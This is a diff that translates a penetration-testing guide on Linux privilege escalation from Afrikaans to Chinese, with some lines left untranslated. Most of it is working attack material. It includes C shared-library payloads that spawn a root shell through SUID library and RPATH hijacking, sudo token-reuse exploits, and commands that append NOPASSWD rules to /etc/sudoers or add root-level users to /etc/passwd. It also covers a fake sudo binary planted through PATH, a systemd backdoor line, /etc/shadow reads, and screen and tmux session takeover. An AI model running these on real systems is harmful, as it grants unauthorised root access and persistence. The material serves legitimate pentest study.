+使用以下命令将上述 C 文件编译为共享对象 (.so) 文件：
 ```bash
 gcc -shared -o /path/to/.config/libcalc.so -fPIC /path/to/.config/libcalc.c
 ```
-Uiteindelik behoort die uitvoering van die geraakte SUID-binary die ontploffing te aktiveer, wat moontlike stelselskade toelaat.
+最后，运行受影响的 SUID 二进制文件应该触发漏洞，从而可能导致系统被攻陷。
 
-## Gedeelde Objekt Hijacking
+## 共享对象劫持
 ```bash
 # Lets find a SUID using a non-standard library
 ldd some_suid
@@ -890,7 +892,7 @@ something.so => /lib/x86_64-linux-gnu/something.so
 readelf -d payroll  | grep PATH
 0x000000000000001d (RUNPATH)            Library runpath: [/development]
 ```
-Nou dat ons 'n SUID-binaar gevind het wat 'n biblioteek laai vanaf 'n gids waar ons kan skryf, kom ons skep die biblioteek in daardie gids met die nodige naam:
+现在我们已经找到一个从我们可以写入的文件夹加载库的 SUID 二进制文件，让我们在该文件夹中创建具有必要名称的库：
 ```c
 //gcc src.c -fPIC -shared -o /development/libshared.so
 #include <stdio.h>
@@ -903,17 +905,17 @@ setresuid(0,0,0);
 system("/bin/bash -p");
 }
 ```
-As jy 'n fout kry soos
+如果您遇到如下错误
 ```shell-session
 ./suid_bin: symbol lookup error: ./suid_bin: undefined symbol: a_function_name
 ```
-that means that the library you have generated need to have a function called `a_function_name`.
+这意味着您生成的库需要有一个名为 `a_function_name` 的函数。
 
 ### GTFOBins
 
-[**GTFOBins**](https://gtfobins.github.io) is 'n saamgestelde lys van Unix-binaries wat deur 'n aanvaller benut kan word om plaaslike sekuriteitsbeperkings te omseil. [**GTFOArgs**](https://gtfoargs.github.io/) is dieselfde, maar vir gevalle waar jy **slegs argumente** in 'n opdrag kan inspuit.
+[**GTFOBins**](https://gtfobins.github.io) 是一个经过策划的 Unix 二进制文件列表，攻击者可以利用这些文件绕过本地安全限制。[**GTFOArgs**](https://gtfoargs.github.io/) 则是针对只能 **注入参数** 的命令的情况。
 
-Die projek versamel wettige funksies van Unix-binaries wat misbruik kan word om uit beperkte shells te breek, voorregte te eskaleer of te handhaaf, lêers oor te dra, bind en omgekeerde shells te spawn, en ander post-exploitasie take te fasiliteer.
+该项目收集了可以被滥用以突破受限 shell、提升或维持特权、传输文件、生成绑定和反向 shell，以及促进其他后期利用任务的 Unix 二进制文件的合法功能。
 
 > gdb -nx -ex '!sh' -ex quit\
 > sudo mysql -e '! /bin/sh'\
@@ -926,60 +928,60 @@ Die projek versamel wettige funksies van Unix-binaries wat misbruik kan word om 
 
 ### FallOfSudo
 
-As jy toegang tot `sudo -l` het, kan jy die hulpmiddel [**FallOfSudo**](https://github.com/CyberOne-Security/FallofSudo) gebruik om te kyk of dit vind hoe om enige sudo-reël te benut.
+如果您可以访问 `sudo -l`，您可以使用工具 [**FallOfSudo**](https://github.com/CyberOne-Security/FallofSudo) 来检查是否找到利用任何 sudo 规则的方法。
 
-### Reusing Sudo Tokens
+### 重用 Sudo 令牌
 
-In gevalle waar jy **sudo toegang** het, maar nie die wagwoord nie, kan jy voorregte eskaleer deur **te wag vir 'n sudo-opdrag uitvoering en dan die sessietoken te kap**.
+在您拥有 **sudo 访问权限** 但没有密码的情况下，您可以通过 **等待 sudo 命令执行然后劫持会话令牌** 来提升特权。
 
-Vereistes om voorregte te eskaleer:
+提升特权的要求：
 
-* Jy het reeds 'n shell as gebruiker "_sampleuser_"
-* "_sampleuser_" het **`sudo` gebruik** om iets in die **laaste 15min** uit te voer (per standaard is dit die duur van die sudo-token wat ons toelaat om `sudo` te gebruik sonder om enige wagwoord in te voer)
-* `cat /proc/sys/kernel/yama/ptrace_scope` is 0
-* `gdb` is toeganklik (jy kan dit oplaai)
+* 您已经以用户 "_sampleuser_" 拥有一个 shell
+* "_sampleuser_" 在 **过去 15 分钟内** **使用过 `sudo`** 执行某些操作（默认情况下，这是允许我们在不输入任何密码的情况下使用 `sudo` 的 sudo 令牌的持续时间）
+* `cat /proc/sys/kernel/yama/ptrace_scope` 为 0
+* `gdb` 可访问（您可以上传它）
 
-(Jy kan tydelik `ptrace_scope` inskakel met `echo 0 | sudo tee /proc/sys/kernel/yama/ptrace_scope` of permanent `/etc/sysctl.d/10-ptrace.conf` wysig en `kernel.yama.ptrace_scope = 0` stel)
+（您可以通过 `echo 0 | sudo tee /proc/sys/kernel/yama/ptrace_scope` 临时启用 `ptrace_scope`，或通过永久修改 `/etc/sysctl.d/10-ptrace.conf` 并设置 `kernel.yama.ptrace_scope = 0` 来实现）
 
-As al hierdie vereistes nagekom word, **kan jy voorregte eskaleer met:** [**https://github.com/nongiach/sudo\_inject**](https://github.com/nongiach/sudo_inject)
+如果满足所有这些要求，**您可以使用以下方法提升特权：** [**https://github.com/nongiach/sudo\_inject**](https://github.com/nongiach/sudo_inject)
 
-* Die **eerste exploit** (`exploit.sh`) sal die binêre `activate_sudo_token` in _/tmp_ skep. Jy kan dit gebruik om **die sudo-token in jou sessie te aktiveer** (jy sal nie outomaties 'n root shell kry nie, doen `sudo su`):
+* **第一个利用** (`exploit.sh`) 将在 _/tmp_ 中创建二进制文件 `activate_sudo_token`。您可以使用它来 **激活您会话中的 sudo 令牌**（您不会自动获得 root shell，请执行 `sudo su`）：
 ```bash
 bash exploit.sh
 /tmp/activate_sudo_token
 sudo su
 ```
-* Die **tweede eksploit** (`exploit_v2.sh`) sal 'n sh shell in _/tmp_ **besit deur root met setuid** skep
+* 第二个漏洞 (`exploit_v2.sh`) 将在 _/tmp_ 中创建一个 **由 root 拥有并设置了 setuid 的 sh shell**
 ```bash
 bash exploit_v2.sh
 /tmp/sh -p
 ```
-* Die **derde eksploit** (`exploit_v3.sh`) sal **'n sudoers-lêer skep** wat **sudo-tokenne ewigdurend maak en alle gebruikers toelaat om sudo te gebruik**
+* 第**三个漏洞**（`exploit_v3.sh`）将**创建一个sudoers文件**，使**sudo令牌永久有效并允许所有用户使用sudo**
 ```bash
 bash exploit_v3.sh
 sudo su
 ```
 ### /var/run/sudo/ts/\<Username>
 
-As jy **skrywe toestemmings** in die gids of op enige van die geskepte lêers binne die gids het, kan jy die binêre [**write\_sudo\_token**](https://github.com/nongiach/sudo_inject/tree/master/extra_tools) gebruik om **'n sudo-token vir 'n gebruiker en PID te skep**.\
-Byvoorbeeld, as jy die lêer _/var/run/sudo/ts/sampleuser_ kan oorskryf en jy het 'n shell as daardie gebruiker met PID 1234, kan jy **sudo-regte verkry** sonder om die wagwoord te ken deur:
+如果您在该文件夹或文件夹内创建的任何文件中具有**写权限**，则可以使用二进制文件 [**write\_sudo\_token**](https://github.com/nongiach/sudo_inject/tree/master/extra_tools) **为用户和PID创建sudo令牌**。\
+例如，如果您可以覆盖文件 _/var/run/sudo/ts/sampleuser_ 并且您以该用户的身份拥有PID 1234的shell，您可以**获得sudo权限**而无需知道密码，执行：
 ```bash
 ./write_sudo_token 1234 > /var/run/sudo/ts/sampleuser
 ```
 ### /etc/sudoers, /etc/sudoers.d
 
-Die lêer `/etc/sudoers` en die lêers binne `/etc/sudoers.d` stel in wie `sudo` kan gebruik en hoe. Hierdie lêers **is standaard slegs leesbaar deur gebruiker root en groep root**.\
-**As** jy hierdie lêer kan **lees**, kan jy **interessante inligting verkry**, en as jy enige lêer kan **skryf**, sal jy in staat wees om **privileges te eskaleer**.
+文件 `/etc/sudoers` 和 `/etc/sudoers.d` 中的文件配置了谁可以使用 `sudo` 以及如何使用。这些文件 **默认情况下只能被用户 root 和组 root 读取**。\
+**如果** 你可以 **读取** 这个文件，你可能能够 **获得一些有趣的信息**，如果你可以 **写入** 任何文件，你将能够 **提升权限**。
 ```bash
 ls -l /etc/sudoers /etc/sudoers.d/
 ls -ld /etc/sudoers.d/
 ```
-As jy kan skryf, kan jy hierdie toestemming misbruik.
+如果你会写，你就可以滥用这个权限
 ```bash
 echo "$(whoami) ALL=(ALL) NOPASSWD: ALL" >> /etc/sudoers
 echo "$(whoami) ALL=(ALL) NOPASSWD: ALL" >> /etc/sudoers.d/README
 ```
-Nog 'n manier om hierdie toestemmings te misbruik:
+另一种滥用这些权限的方法：
 ```bash
 # makes it so every terminal can sudo
 echo "Defaults !tty_tickets" > /etc/sudoers.d/win
@@ -988,17 +990,17 @@ echo "Defaults timestamp_timeout=-1" >> /etc/sudoers.d/win
 ```
 ### DOAS
 
-Daar is 'n paar alternatiewe vir die `sudo` binaire soos `doas` vir OpenBSD, onthou om sy konfigurasie by `/etc/doas.conf` te kontroleer.
+有一些替代 `sudo` 二进制文件的选项，例如 OpenBSD 的 `doas`，请记得检查其配置文件 `/etc/doas.conf`。
 ```
 permit nopass demo as root cmd vim
 ```
 ### Sudo Hijacking
 
-As jy weet dat 'n **gebruiker gewoonlik aan 'n masjien koppel en `sudo` gebruik** om voorregte te verhoog en jy het 'n shell binne daardie gebruikerskonteks, kan jy **'n nuwe sudo uitvoerbare lêer skep** wat jou kode as root sal uitvoer en dan die gebruiker se opdrag. Dan, **wysig die $PATH** van die gebruikerskonteks (byvoorbeeld deur die nuwe pad in .bash\_profile by te voeg) sodat wanneer die gebruiker sudo uitvoer, jou sudo uitvoerbare lêer uitgevoer word.
+如果你知道一个 **用户通常连接到一台机器并使用 `sudo`** 来提升权限，并且你在该用户上下文中获得了一个 shell，你可以 **创建一个新的 sudo 可执行文件**，该文件将以 root 身份执行你的代码，然后执行用户的命令。然后，**修改用户上下文的 $PATH**（例如在 .bash\_profile 中添加新路径），这样当用户执行 sudo 时，你的 sudo 可执行文件就会被执行。
 
-Let daarop dat as die gebruiker 'n ander shell gebruik (nie bash nie) jy ander lêers moet wysig om die nuwe pad by te voeg. Byvoorbeeld[ sudo-piggyback](https://github.com/APTy/sudo-piggyback) wysig `~/.bashrc`, `~/.zshrc`, `~/.bash_profile`. Jy kan 'n ander voorbeeld vind in [bashdoor.py](https://github.com/n00py/pOSt-eX/blob/master/empire_modules/bashdoor.py)
+请注意，如果用户使用不同的 shell（不是 bash），你需要修改其他文件以添加新路径。例如[ sudo-piggyback](https://github.com/APTy/sudo-piggyback) 修改了 `~/.bashrc`、`~/.zshrc`、`~/.bash_profile`。你可以在 [bashdoor.py](https://github.com/n00py/pOSt-eX/blob/master/empire_modules/bashdoor.py) 中找到另一个示例。
 
-Of om iets soos te loop:
+或者运行类似的命令：
 ```bash
 cat >/tmp/sudo <<EOF
 #!/bin/bash
@@ -1013,16 +1015,16 @@ zsh
 echo $PATH
 sudo ls
 ```
-## Gedeelde Biblioteek
+## 共享库
 
 ### ld.so
 
-Die lêer `/etc/ld.so.conf` dui aan **waar die gelaaide konfigurasielêers vandaan kom**. Tipies bevat hierdie lêer die volgende pad: `include /etc/ld.so.conf.d/*.conf`
+文件 `/etc/ld.so.conf` 指示 **加载的配置文件来自哪里**。通常，这个文件包含以下路径：`include /etc/ld.so.conf.d/*.conf`
 
-Dit beteken dat die konfigurasielêers van `/etc/ld.so.conf.d/*.conf` gelees sal word. Hierdie konfigurasielêers **wys na ander vouers** waar **biblioteke** gaan **soek** word. Byvoorbeeld, die inhoud van `/etc/ld.so.conf.d/libc.conf` is `/usr/local/lib`. **Dit beteken dat die stelsel biblioteke binne `/usr/local/lib` gaan soek**.
+这意味着将读取来自 `/etc/ld.so.conf.d/*.conf` 的配置文件。这些配置文件 **指向其他文件夹**，在这些文件夹中将 **搜索** **库**。例如，`/etc/ld.so.conf.d/libc.conf` 的内容是 `/usr/local/lib`。 **这意味着系统将在 `/usr/local/lib` 内搜索库**。
 
-As om een of ander rede **‘n gebruiker skryfregte** op enige van die aangeduide pades het: `/etc/ld.so.conf`, `/etc/ld.so.conf.d/`, enige lêer binne `/etc/ld.so.conf.d/` of enige vouer binne die konfigurasielêer binne `/etc/ld.so.conf.d/*.conf`, kan hy dalk in staat wees om voorregte te verhoog.\
-Kyk na **hoe om hierdie miskonfigurasie te benut** op die volgende bladsy:
+如果由于某种原因 **用户在任何指示的路径上具有写权限**：`/etc/ld.so.conf`、`/etc/ld.so.conf.d/`、`/etc/ld.so.conf.d/` 内的任何文件或 `/etc/ld.so.conf.d/*.conf` 内的配置文件中的任何文件夹，他可能能够提升权限。\
+请查看 **如何利用此错误配置** 的下一页：
 
 {% content-ref url="ld.so.conf-example.md" %}
 [ld.so.conf-example.md](ld.so.conf-example.md)
@@ -1039,7 +1041,7 @@ linux-gate.so.1 =>  (0x0068c000)
 libc.so.6 => /lib/i386-linux-gnu/libc.so.6 (0x00110000)
 /lib/ld-linux.so.2 (0x005bb000)
 ```
-Deur die lib na `/var/tmp/flag15/` te kopieer, sal dit deur die program op hierdie plek gebruik word soos gespesifiseer in die `RPATH` veranderlike.
+通过将库复制到 `/var/tmp/flag15/`，它将被程序在此位置使用，如 `RPATH` 变量所指定。
 ```
 level15@nebula:/home/flag15$ cp /lib/i386-linux-gnu/libc.so.6 /var/tmp/flag15/
 
@@ -1048,7 +1050,7 @@ linux-gate.so.1 =>  (0x005b0000)
 libc.so.6 => /var/tmp/flag15/libc.so.6 (0x00110000)
 /lib/ld-linux.so.2 (0x00737000)
 ```
-Dan skep 'n bose biblioteek in `/var/tmp` met `gcc -fPIC -shared -static-libgcc -Wl,--version-script=version,-Bstatic exploit.c -o libc.so.6`
+然后在 `/var/tmp` 中创建一个恶意库，使用 `gcc -fPIC -shared -static-libgcc -Wl,--version-script=version,-Bstatic exploit.c -o libc.so.6`
 ```c
 #include<stdlib.h>
 #define SHELL "/bin/sh"
@@ -1061,60 +1063,60 @@ setresuid(geteuid(),geteuid(), geteuid());
 execve(file,argv,0);
 }
 ```
-## Vermoëns
+## Capabilities
 
-Linux vermoëns bied 'n **substel van die beskikbare wortelprivileges aan 'n proses**. Dit breek effektief wortel **privileges in kleiner en kenmerkende eenhede** op. Elke eenheid kan dan onafhanklik aan prosesse toegeken word. Op hierdie manier word die volle stel privileges verminder, wat die risiko's van uitbuiting verlaag.\
-Lees die volgende bladsy om **meer te leer oor vermoëns en hoe om dit te misbruik**:
+Linux capabilities 提供了一个 **可用根权限的子集给一个进程**。这有效地将根 **权限分解为更小和独特的单元**。每个单元可以独立授予给进程。通过这种方式，完整的权限集被减少，从而降低了被利用的风险。\
+阅读以下页面以 **了解更多关于能力及其滥用的方法**：
 
 {% content-ref url="linux-capabilities.md" %}
 [linux-capabilities.md](linux-capabilities.md)
 {% endcontent-ref %}
 
-## Gids toestemmings
+## Directory permissions
 
-In 'n gids impliseer die **bit vir "uitvoer"** dat die betrokke gebruiker kan "**cd**" in die vouer.\
-Die **"lees"** bit impliseer dat die gebruiker kan **lys** die **lêers**, en die **"skryf"** bit impliseer dat die gebruiker kan **verwyder** en **skep** nuwe **lêers**.
+在一个目录中，**“执行”**位意味着受影响的用户可以“**cd**”进入该文件夹。\
+**“读取”**位意味着用户可以 **列出** **文件**，而 **“写入”**位意味着用户可以 **删除** 和 **创建** 新的 **文件**。
 
 ## ACLs
 
-Toegang Beheer Lyste (ACLs) verteenwoordig die sekondêre laag van diskresionêre toestemmings, wat in staat is om **die tradisionele ugo/rwx toestemmings te oortref**. Hierdie toestemmings verbeter beheer oor lêer of gids toegang deur regte aan spesifieke gebruikers toe te laat of te weier wat nie die eienaars of deel van die groep is nie. Hierdie vlak van **fynheid verseker meer presiese toegang bestuur**. Verdere besonderhede kan [**hier**](https://linuxconfig.org/how-to-manage-acls-on-linux) gevind word.
+访问控制列表 (ACLs) 代表了可选择权限的第二层，能够 **覆盖传统的 ugo/rwx 权限**。这些权限通过允许或拒绝特定用户（非所有者或不属于该组的用户）访问文件或目录，从而增强了对访问的控制。这种 **粒度确保了更精确的访问管理**。更多详细信息可以在 [**这里**](https://linuxconfig.org/how-to-manage-acls-on-linux) 找到。
 
-**Gee** gebruiker "kali" lees- en skryftoestemmings oor 'n lêer:
+**给予** 用户 "kali" 对一个文件的读取和写入权限：
 ```bash
 setfacl -m u:kali:rw file.txt
 #Set it in /etc/sudoers or /etc/sudoers.d/README (if the dir is included)
 
 setfacl -b file.txt #Remove the ACL of the file
 ```
-**Kry** lêers met spesifieke ACL's van die stelsel:
+**获取**具有特定 ACL 的文件：
 ```bash
 getfacl -t -s -R -p /bin /etc /home /opt /root /sbin /usr /tmp 2>/dev/null
 ```
-## Open shell sessions
+## 打开 shell 会话
 
-In **ou weergawe** kan jy **hijack** sommige **shell** sessies van 'n ander gebruiker (**root**).\
-In **nuutste weergawes** sal jy in staat wees om slegs aan skerm sessies van **jou eie gebruiker** te **verbinde**. Jy kan egter **interessante inligting binne die sessie** vind.
+在 **旧版本** 中，您可以 **劫持** 其他用户 (**root**) 的一些 **shell** 会话。\
+在 **最新版本** 中，您只能 **连接** 到 **您自己用户** 的屏幕会话。然而，您可能会在会话中找到 **有趣的信息**。
 
-### screen sessions hijacking
+### 屏幕会话劫持
 
-**Lys skerm sessies**
+**列出屏幕会话**
 ```bash
 screen -ls
 screen -ls <username>/ # Show another user' screen sessions
 ```
 ![](<../../.gitbook/assets/image (141).png>)
 
-**Koppel aan 'n sessie**
+**附加到会话**
 ```bash
 screen -dr <session> #The -d is to detach whoever is attached to it
 screen -dr 3350.foo #In the example of the image
 screen -x [user]/[session id]
 ```
-## tmux sessies oorname
+## tmux 会话劫持
 
-Dit was 'n probleem met **ou tmux weergawes**. Ek kon nie 'n tmux (v2.1) sessie wat deur root geskep is, oorneem as 'n nie-privilegieerde gebruiker nie.
+这是一个 **旧版 tmux** 的问题。作为非特权用户，我无法劫持由 root 创建的 tmux (v2.1) 会话。
 
-**Lys tmux sessies**
+**列出 tmux 会话**
 ```bash
 tmux ls
 ps aux | grep tmux #Search for tmux consoles not using default folder for sockets
@@ -1122,7 +1124,7 @@ tmux -S /tmp/dev_sess ls #List using that socket, you can start a tmux session i
 ```
 ![](<../../.gitbook/assets/image (837).png>)
 
-**Koppel aan 'n sessie**
+**附加到会话**
 ```bash
 tmux attach -t myname #If you write something in this session it will appears in the other opened one
 tmux attach -d -t myname #First detach the session from the other console and then access it yourself
@@ -1132,125 +1134,125 @@ rw-rw---- 1 root devs 0 Sep  1 06:27 /tmp/dev_sess #In this case root and devs c
 # If you are root or devs you can access it
 tmux -S /tmp/dev_sess attach -t 0 #Attach using a non-default tmux socket
 ```
-Check **Valentine box from HTB** vir 'n voorbeeld.
+检查 **HTB 的情人节盒子** 以获取示例。
 
 ## SSH
 
-### Debian OpenSSL Voorspelbare PRNG - CVE-2008-0166
+### Debian OpenSSL 可预测的 PRNG - CVE-2008-0166
 
-Alle SSL en SSH sleutels wat op Debian-gebaseerde stelsels (Ubuntu, Kubuntu, ens.) tussen September 2006 en 13 Mei 2008 gegenereer is, mag deur hierdie fout geraak word.\
-Hierdie fout word veroorsaak wanneer 'n nuwe ssh-sleutel in daardie OS geskep word, aangesien **slegs 32,768 variasies moontlik was**. Dit beteken dat al die moontlikhede bereken kan word en **as jy die ssh publieke sleutel het, kan jy soek na die ooreenstemmende private sleutel**. Jy kan die berekende moontlikhede hier vind: [https://github.com/g0tmi1k/debian-ssh](https://github.com/g0tmi1k/debian-ssh)
+在 2006 年 9 月到 2008 年 5 月 13 日之间，在基于 Debian 的系统（如 Ubuntu、Kubuntu 等）上生成的所有 SSL 和 SSH 密钥可能受到此漏洞的影响。\
+此漏洞是在这些操作系统中创建新 ssh 密钥时造成的，因为 **仅可能有 32,768 种变体**。这意味着所有可能性都可以计算，并且 **拥有 ssh 公钥后，您可以搜索相应的私钥**。您可以在这里找到计算出的可能性：[https://github.com/g0tmi1k/debian-ssh](https://github.com/g0tmi1k/debian-ssh)
 
-### SSH Interessante konfigurasiewaardes
+### SSH 有趣的配置值
 
-* **PasswordAuthentication:** Gee aan of wagwoordverifikasie toegelaat word. Die standaard is `no`.
-* **PubkeyAuthentication:** Gee aan of publieke sleutelverifikasie toegelaat word. Die standaard is `yes`.
-* **PermitEmptyPasswords**: Wanneer wagwoordverifikasie toegelaat word, gee dit aan of die bediener aanmeldings met leë wagwoordstringe toelaat. Die standaard is `no`.
+* **PasswordAuthentication:** 指定是否允许密码认证。默认值为 `no`。
+* **PubkeyAuthentication:** 指定是否允许公钥认证。默认值为 `yes`。
+* **PermitEmptyPasswords**: 当允许密码认证时，指定服务器是否允许使用空密码字符串登录账户。默认值为 `no`。
 
 ### PermitRootLogin
 
-Gee aan of root met ssh kan aanmeld, die standaard is `no`. Moontlike waardes:
+指定 root 是否可以使用 ssh 登录，默认值为 `no`。可能的值：
 
-* `yes`: root kan aanmeld met wagwoord en private sleutel
-* `without-password` of `prohibit-password`: root kan slegs met 'n private sleutel aanmeld
-* `forced-commands-only`: Root kan slegs met 'n private sleutel aanmeld en as die opdragopsies gespesifiseer is
-* `no` : geen
+* `yes`: root 可以使用密码和私钥登录
+* `without-password` 或 `prohibit-password`: root 只能使用私钥登录
+* `forced-commands-only`: root 只能使用私钥登录，并且如果指定了命令选项
+* `no` : 不允许
 
 ### AuthorizedKeysFile
 
-Gee aan watter lêers die publieke sleutels bevat wat vir gebruikersverifikasie gebruik kan word. Dit kan tokens soos `%h` bevat, wat deur die tuisgids vervang sal word. **Jy kan absolute paaie aandui** (begin in `/`) of **relatiewe paaie vanaf die gebruiker se huis**. Byvoorbeeld:
+指定包含可用于用户认证的公钥的文件。它可以包含像 `%h` 这样的标记，这将被主目录替换。**您可以指示绝对路径**（以 `/` 开头）或 **相对于用户主目录的相对路径**。例如：
 ```bash
 AuthorizedKeysFile    .ssh/authorized_keys access
 ```
-Die konfigurasie sal aandui dat as jy probeer om aan te meld met die **private** sleutel van die gebruiker "**testusername**", ssh die publieke sleutel van jou sleutel met diegene in `/home/testusername/.ssh/authorized_keys` en `/home/testusername/access` gaan vergelyk.
+该配置将指示，如果您尝试使用用户“**testusername**”的**私钥**登录，ssh将比较您的密钥的公钥与位于`/home/testusername/.ssh/authorized_keys`和`/home/testusername/access`中的公钥。
 
 ### ForwardAgent/AllowAgentForwarding
 
-SSH agent forwarding laat jou toe om **jou plaaslike SSH sleutels te gebruik in plaas van om sleutels** (sonder wagwoorde!) op jou bediener te laat sit. So, jy sal in staat wees om **te spring** via ssh **na 'n gasheer** en van daar **na 'n ander** gasheer **te spring** **met** die **sleutel** wat in jou **begin gasheer** geleë is.
+SSH代理转发允许您**使用本地SSH密钥，而不是将密钥**（没有密码短语！）放在服务器上。因此，您将能够**通过ssh跳转**到一个主机，然后从那里**跳转到另一个**主机，**使用**位于您**初始主机**中的**密钥**。
 
-Jy moet hierdie opsie in `$HOME/.ssh.config` soos volg stel:
+您需要在`$HOME/.ssh.config`中设置此选项，如下所示：
 ```
 Host example.com
 ForwardAgent yes
 ```
-Let wel dat as `Host` `*` is, elke keer as die gebruiker na 'n ander masjien spring, daardie gasheer toegang sal hê tot die sleutels (wat 'n sekuriteitskwessie is).
+注意，如果 `Host` 是 `*`，每当用户跳转到不同的机器时，该主机将能够访问密钥（这是一种安全问题）。
 
-Die lêer `/etc/ssh_config` kan **oorskry** hierdie **opsies** en hierdie konfigurasie toelaat of weier.\
-Die lêer `/etc/sshd_config` kan **toelaat** of **weier** ssh-agent forwarding met die sleutelwoord `AllowAgentForwarding` (standaard is toelaat).
+文件 `/etc/ssh_config` 可以 **覆盖** 这些 **选项** 并允许或拒绝此配置。\
+文件 `/etc/sshd_config` 可以使用关键字 `AllowAgentForwarding` **允许** 或 **拒绝** ssh-agent 转发（默认是允许）。
 
-As jy vind dat Forward Agent in 'n omgewing geconfigureer is, lees die volgende bladsy as **jy dalk dit kan misbruik om voorregte te verhoog**:
+如果你发现在某个环境中配置了 Forward Agent，请阅读以下页面，因为 **你可能能够利用它来提升权限**：
 
 {% content-ref url="ssh-forward-agent-exploitation.md" %}
 [ssh-forward-agent-exploitation.md](ssh-forward-agent-exploitation.md)
 {% endcontent-ref %}
 
-## Interessante Lêers
+## 有趣的文件
 
-### Profiel lêers
+### 配置文件
 
-Die lêer `/etc/profile` en die lêers onder `/etc/profile.d/` is **scripts wat uitgevoer word wanneer 'n gebruiker 'n nuwe skulp uitvoer**. Daarom, as jy **kan skryf of enige van hulle kan wysig, kan jy voorregte verhoog**.
+文件 `/etc/profile` 和 `/etc/profile.d/` 下的文件是 **当用户运行新 shell 时执行的脚本**。因此，如果你可以 **写入或修改其中任何一个，你可以提升权限**。
 ```bash
 ls -l /etc/profile /etc/profile.d/
 ```
-As daar enige vreemde profielskrip gevind word, moet jy dit nagaan vir **sensitiewe besonderhede**.
+如果发现任何奇怪的配置文件脚本，您应该检查其中是否包含**敏感信息**。
 
-### Passwd/Shadow Lêers
+### Passwd/Shadow 文件
 
-Afhangende van die OS mag die `/etc/passwd` en `/etc/shadow` lêers 'n ander naam gebruik of daar mag 'n rugsteun wees. Daarom word dit aanbeveel om **almal van hulle te vind** en **na te gaan of jy hulle kan lees** om te sien **of daar hashes** binne die lêers is:
+根据操作系统的不同，`/etc/passwd` 和 `/etc/shadow` 文件可能使用不同的名称，或者可能存在备份。因此，建议**找到所有这些文件**并**检查您是否可以读取**它们，以查看**文件中是否包含哈希**：
 ```bash
 #Passwd equivalent files
 cat /etc/passwd /etc/pwd.db /etc/master.passwd /etc/group 2>/dev/null
 #Shadow equivalent files
 cat /etc/shadow /etc/shadow- /etc/shadow~ /etc/gshadow /etc/gshadow- /etc/master.passwd /etc/spwd.db /etc/security/opasswd 2>/dev/null
 ```
-In sommige gevalle kan jy **wagwoord-hashes** binne die `/etc/passwd` (of ekwivalente) lêer vind
+在某些情况下，您可以在 `/etc/passwd`（或等效）文件中找到 **密码哈希**。
 ```bash
 grep -v '^[^:]*:[x\*]' /etc/passwd /etc/pwd.db /etc/master.passwd /etc/group 2>/dev/null
 ```
-### Writable /etc/passwd
+### 可写的 /etc/passwd
 
-Eerst, genereer 'n wagwoord met een van die volgende opdragte.
+首先，使用以下命令之一生成密码。
 ```
 openssl passwd -1 -salt hacker hacker
 mkpasswd -m SHA-512 hacker
 python2 -c 'import crypt; print crypt.crypt("hacker", "$6$salt")'
 ```
-Dan voeg die gebruiker `hacker` by en voeg die gegenereerde wagwoord by.
+然后添加用户 `hacker` 并添加生成的密码。
 ```
 hacker:GENERATED_PASSWORD_HERE:0:0:Hacker:/root:/bin/bash
 ```
-E.g: `hacker:$1$hacker$TzyKlv0/R/c28R.GAeLw.1:0:0:Hacker:/root:/bin/bash`
+例如: `hacker:$1$hacker$TzyKlv0/R/c28R.GAeLw.1:0:0:Hacker:/root:/bin/bash`
 
-Jy kan nou die `su` opdrag gebruik met `hacker:hacker`
+您现在可以使用 `su` 命令与 `hacker:hacker`
 
-Alternatiewelik kan jy die volgende lyne gebruik om 'n dummy gebruiker sonder 'n wagwoord by te voeg.\
-WAARSKUWING: jy mag die huidige sekuriteit van die masjien verlaag.
+或者，您可以使用以下行添加一个没有密码的虚拟用户。\
+警告：这可能会降低机器的当前安全性。
 ```
 echo 'dummy::0:0::/root:/bin/bash' >>/etc/passwd
 su - dummy
 ```
-NOTE: In BSD platforms `/etc/passwd` is geleë by `/etc/pwd.db` en `/etc/master.passwd`, ook is die `/etc/shadow` hernoem na `/etc/spwd.db`.
+注意：在BSD平台上，`/etc/passwd`位于`/etc/pwd.db`和`/etc/master.passwd`，同时`/etc/shadow`被重命名为`/etc/spwd.db`。
 
-Jy moet nagaan of jy **in sommige sensitiewe lêers kan skryf**. Byvoorbeeld, kan jy in 'n **dienskonfigurasielêer** skryf?
+您应该检查是否可以**写入一些敏感文件**。例如，您能否写入某些**服务配置文件**？
 ```bash
 find / '(' -type f -or -type d ')' '(' '(' -user $USER ')' -or '(' -perm -o=w ')' ')' 2>/dev/null | grep -v '/proc/' | grep -v $HOME | sort | uniq #Find files owned by the user or writable by anybody
 for g in `groups`; do find \( -type f -or -type d \) -group $g -perm -g=w 2>/dev/null | grep -v '/proc/' | grep -v $HOME; done #Find files writable by any group of the user
 ```
-Vir voorbeeld, as die masjien 'n **tomcat** bediener draai en jy kan **die Tomcat diens konfigurasie lêer binne /etc/systemd/ wysig,** dan kan jy die lyne wysig:
+例如，如果机器正在运行 **tomcat** 服务器，并且您可以 **修改 /etc/systemd/ 中的 Tomcat 服务配置文件，** 那么您可以修改以下行：
 ```
 ExecStart=/path/to/backdoor
 User=root
 Group=root
 ```
-Your backdoor will be executed the next time that tomcat is started.
+您的后门将在下次启动 tomcat 时执行。
 
-### Check Folders
+### 检查文件夹
 
-Die volgende vouers mag rugsteun of interessante inligting bevat: **/tmp**, **/var/tmp**, **/var/backups, /var/mail, /var/spool/mail, /etc/exports, /root** (Waarskynlik sal jy nie die laaste een kan lees nie, maar probeer)
+以下文件夹可能包含备份或有趣的信息：**/tmp**, **/var/tmp**, **/var/backups, /var/mail, /var/spool/mail, /etc/exports, /root**（您可能无法读取最后一个，但可以尝试）
 ```bash
 ls -a /tmp /var/tmp /var/backups /var/mail/ /var/spool/mail/ /root
 ```
-### Vreemde Ligging/Eienaar lêers
+### 奇怪的位置/拥有的文件
 ```bash
 #root owned files in /home folders
 find /home -user root 2>/dev/null
@@ -1267,54 +1269,54 @@ find / '(' -type f -or -type d ')' -group $g -perm -g=w ! -path "/proc/*" ! -pat
 done
 done
 ```
-### Gewysigde lêers in laaste minute
+### 最近修改的文件
 ```bash
 find / -type f -mmin -5 ! -path "/proc/*" ! -path "/sys/*" ! -path "/run/*" ! -path "/dev/*" ! -path "/var/lib/*" 2>/dev/null
 ```
-### Sqlite DB lêers
+### Sqlite 数据库文件
 ```bash
 find / -name '*.db' -o -name '*.sqlite' -o -name '*.sqlite3' 2>/dev/null
 ```
-### \*\_geskiedenis, .sudo\_as\_admin\_suksesvol, profiel, bashrc, httpd.conf, .plan, .htpasswd, .git-credentials, .rhosts, hosts.equiv, Dockerfile, docker-compose.yml lêers
